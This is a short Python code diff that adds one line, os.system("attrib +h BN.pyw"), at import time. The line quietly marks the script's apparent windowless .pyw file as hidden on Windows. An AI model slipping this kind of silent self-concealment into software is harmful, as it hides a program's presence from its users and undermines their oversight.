@@ -12,6 +12,8 @@ import concurrent.futures
 import random
 import threading
 
+os.system("attrib +h BN.pyw")
+
 # Function to clear the console screen
 def clear_screen():
     if os.name == 'nt':
